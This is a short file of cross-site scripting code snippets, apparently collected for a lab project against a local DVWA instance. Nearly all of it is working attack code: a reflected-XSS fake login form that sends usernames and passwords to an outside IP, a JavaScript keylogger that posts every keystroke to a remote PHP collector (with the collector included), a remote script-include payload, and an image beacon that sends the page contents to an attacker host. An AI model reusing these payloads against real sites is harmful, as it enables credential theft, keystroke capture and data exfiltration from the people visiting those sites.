/*
CODE SNIPPETS for XSS project - Source https://websitesecuritystore.com/blog/real-world-cross-site-scripting-examples/
This is not a functional program: just a collection of XSS code that I can use for inspiration
*/


// phishing attack payload - fake form to trick users into providing password
//http://localhost:81/DVWA/vulnerabilities/xss_r/?name=<h3>Please login to proceed</h3> <form action=http://192.165.159.122>Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br><input type="submit" value="Logon"></br>

// javascript keylogger - capture user keystrokes

document.onkeypress = function(event) {
  event = event || window.event
  key = String.fromCharCode(event.charCode)
  if(key) {
    var http = new XMLHttpRequest();
    var param = encodeURI(key)
    http.open("POST", "http://192.165.159.133/keylog.php", true);
    http.setRequestHeader("Content-type", "application/x-www-form-unencoded");
    http.send("key="+param);
  }
}

//keylog.php
<?php
  if(!empty($_POST['key'])) {
    $logfile = fopen('data.txt', 'a+');
    fwrite($logfile, $_POST['key']);
    fclose($logfile);
  }
?>
// vulnerable page called with the payload via the server::
//http://localhost:81/DVWA/vulnerabilities/xss_r/?name=<script src="https://192.165.159.122/xss.js">

// stealing source code / critical information
<script> new Image().src="https://192.165.159.122/fakepg.php?output="+document.body.innerHTML</script>


